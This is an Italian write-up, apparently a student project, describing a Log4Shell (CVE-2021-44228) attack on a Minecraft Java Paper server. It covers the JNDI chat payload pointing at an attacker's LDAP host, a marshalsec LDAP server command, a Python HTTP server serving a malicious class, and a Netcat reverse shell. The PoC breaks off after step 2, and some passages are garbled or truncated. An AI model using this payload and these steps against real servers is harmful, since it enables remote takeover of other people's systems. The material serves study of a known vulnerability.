# Minecraft Server RCE - TRIPALDI Gabriele
## Preambolo:  cos'è un server Minecraft?
Minecraft è un videgioco sandbox molto popolare che da vari anni è stato acquisito dalla Microsoft. Il gioco offre due versioni differenti, la "Java Edition" scritta appunto in Java, e la "Bedrock Edition" una versione multipiattaforma scritta in C++, un server della bedrock edition non supporta client Java e viceversa.
Questo progetto si baserà sui server e client basati sulla versione Java, eseguibile solamente su sistemi Windows, Linux e Mac.

----------
### La vulnerabilità del server
Nella versione 1.8.0/1.8.8 del gioco è stata trovata la vulnerabilità zero-day **CVE-2021-44228**, meglio nota come Log4Shell.
Microsoft ha successivamente rilasciato una patch per prevenirne gli abusi direttamente sostituendo la versione nella repository ufficiale. Questi server sono chiamati "Vanilla", ossia senza modifiche del server stesso, tuttavia non sono in grado di prevenire l'abuso di cheat all'interno del gioco non offrendo funzionalità aggiuntive e per questo motivo sono stati creati dalla community, versioni di terze parti (es: Bukkit, Spigot, Paper) che consentono maggior sicurezza e l'installazione di plugins scritti in Java.
Visto che il server Vanilla vulnerabile è di difficile reperibilità, si è proceduto tramite risorse esterne a scaricare un server di terze parti molto popolare "Paper" che ha successivamente patchato il server ma la sua versione unpatched è più facile da reperire.

**Log4j**: La vulnerabilità si basa sul framework Log4j che consente di gestire il logging dell'applicazione o dei servizi online ed ha anche la possibilità di comunicare con altri servizi sul sistema. Minecraft implementa questo framework che sarà la causa della vulnerabilità.

## L'attacco
L'attacco parte sulla creazione di un server LDAP che sarà il punto di ingresso del traffico verso la vittima.
Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'inziezione del codice malevolo.
Già questo basterebbe per la compromissione del sistema attaccato, tuttavia si è voluto anche creare una classe Java che consenta anche la Remote Code Execution tramite reverse shell. Perciò risulta necessaria la creazione di un ulteriore server TCP, nel nostro caso useremo Netcat.

** **: Nella fase di , una volta scelto il targert, si deve pensare ad una strategia di anominizzazione, s

**Injection**: La fase di iniezione consiste di inviare via chat di gioco, un ????????? così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il framework inzi una connessione LDAP al server dell'attaccante.
Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP.

Una volta che la connessione LDAP è stabilita con l'attccante, il server rigetterà la richiesta al server HTTP che userà la classe Java (precompilata) come response al server vittima.

Il server vittima ricevuta la classe, deserielizzerà il contenuto ed eseguirà il codice all'interno, nel nostro caso, come già anticipato, forzerà il server ad eseguire una nuova connessione TCP al server netcat aprendo una reverse shell.

A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante e potrà eseguire tutte le operazioni che vorrà, magari installando un malware, creare persistenza, effettuare movimenti laterali ecc...

## Tool necessari per l'attacco
* Per il **Server LDAP** si è utilizzata la classe Java `LDAPRefServer.java` nella sezione jndi della repo GitHub [Marshalsec](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) contenente vari tool inerenti *"all'insicurezza"* di Java.

* **JDK 8.1.0_101**: E' necessario l'utilizzo della stessa versione Java con cui il server Minecraft è compilato, altrimenti l'esecuzione della classe malevola sul server non funzionerebbe.
* **Python**: Per l'avvio di un server http che consenta l'invio della classe Java.
* **Netcat**: Per consentire la connesione TCP della vittima all'attccante in modo da fornire una reverse shell.

# PoC
**1)** Scrittura classe Java e compliarla tramite "javac" con la stessa versione del server vulnerabile: `javac <percorso>/NomeClasseJavaMalevola.jar` che darà in output un file .class essenziale per il server HTTP.

**2)** Avvio del server LDAP tramite: `java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <inidirizzo_attacante_serverHTTP>#<NomeClasseJavaMalevola> [<porta>]`
